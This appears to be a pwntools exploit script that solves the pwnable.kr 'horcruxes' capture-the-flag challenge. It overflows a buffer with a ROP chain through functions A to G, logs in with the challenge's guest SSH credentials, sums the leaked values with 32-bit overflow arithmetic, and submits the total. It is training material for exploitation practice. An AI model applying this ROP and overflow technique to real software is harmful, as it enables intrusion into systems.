#!/bin/python3
from pwn import * 
import os

context.log_level = "warn"

payload = cyclic(cyclic_find(b'aabg'))

E    = ELF("./horcruxes") 
ROPME = E.symbols["ropme"]


for i in range(ord('A'),ord('G') + 1):
    payload += p32(E.symbols[chr(i)])
payload += p32(ROPME)


sh = ssh('horcruxes', 'pwnable.kr', password='guest', port=2222)
p = sh.remote('0', 10016)

p.sendline(payload)

p.recvuntil(b"Voldemort\n")

total = 0
for i in range(0,7):
    line = p.recvline().decode()
    total += int(re.findall(r"[+-][0-9]+",line)[0])

# simulate the c overflow of a number bigger than int 
total = total & 0xffffffff
total = total if total < 0x80000000 else total - 0x100000000

p.sendline(b"0")
p.sendline(str(total).encode())
p.recvuntil(b"earned? :")

print(p.recvuntil(b"\n").decode(),end="")
